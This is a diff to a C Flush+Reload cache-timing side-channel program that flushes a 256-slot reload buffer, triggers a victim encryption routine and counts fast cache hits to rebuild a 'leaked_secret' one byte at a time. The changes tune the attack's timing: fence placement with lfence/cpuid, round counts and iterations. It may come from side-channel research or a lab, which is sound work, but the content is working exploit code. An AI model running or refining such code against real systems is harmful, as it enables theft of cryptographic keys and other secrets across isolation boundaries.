@@ -15,17 +15,15 @@
 #include "libcrypto/crypto.h"
 
 #define STRIDE 4096
-#define ROUNDS 5
+#define ROUNDS 10
 #define CAL_SAMPLES 64
 
 static volatile unsigned char sink;
 
 static inline uint64_t time_access(volatile unsigned char *p) {
-    mfence(); cpuid();
     uint64_t t1 = rdtscp();
     sink = *p;
     uint64_t t2 = rdtscp();
-    cpuid();
     return t2 - t1;
 }
 
@@ -33,6 +31,8 @@ static inline uint64_t hit_min(volatile unsigned char *p) {
     uint64_t m = UINT64_MAX;
     for (int i = 0; i < ROUNDS; i++) {
         sink = *p;
+        lfence();
+        cpuid();
         uint64_t dt = time_access(p);
         if (dt < m) m = dt;
     }
@@ -43,6 +43,8 @@ static inline uint64_t miss_min(volatile unsigned char *p) {
     uint64_t m = UINT64_MAX;
     for (int i = 0; i < ROUNDS; i++) {
         clflush((void*)p);
+        lfence();
+        cpuid();
         uint64_t dt = time_access(p);
         if (dt < m) m = dt;
     }
@@ -61,12 +63,13 @@ int main(int argc, char *argv[]) {
     char leaked_secret[secret_length + 1];
     memset(leaked_secret, 0, (secret_length + 1));
 
-    int ITERATIONS = 200;
+    int ITERATIONS = 100;
     int RELOADBUFFER_SIZE = 256 * STRIDE;
     unsigned char *reloadbuffer = (unsigned char*)malloc(RELOADBUFFER_SIZE);
     assert(reloadbuffer);
 
     for (int i = 0; i < 256; i++) reloadbuffer[i * STRIDE] = 1;
+    lfence(); cpuid();
 
     int CACHE_THRESHOLD = calibrate_threshold(reloadbuffer + 128 * STRIDE);
 
@@ -75,12 +78,14 @@ int main(int argc, char *argv[]) {
 
         for (int it = 0; it < ITERATIONS; it++) {
             for (int i = 0; i < 256; i++) clflush(reloadbuffer + i * STRIDE);
-            mfence(); cpuid();
+            lfence(); cpuid();
 
             encrypt_secret_byte(reloadbuffer, STRIDE, (int)idx);
 
             for (int i = 0; i < 256; i++) {
                 int k = (i * 167 + 13) & 255;
+                lfence();
+                cpuid();
                 uint64_t dt = time_access(reloadbuffer + k * STRIDE);
                 if ((int)dt < CACHE_THRESHOLD) counts[k]++;
             }
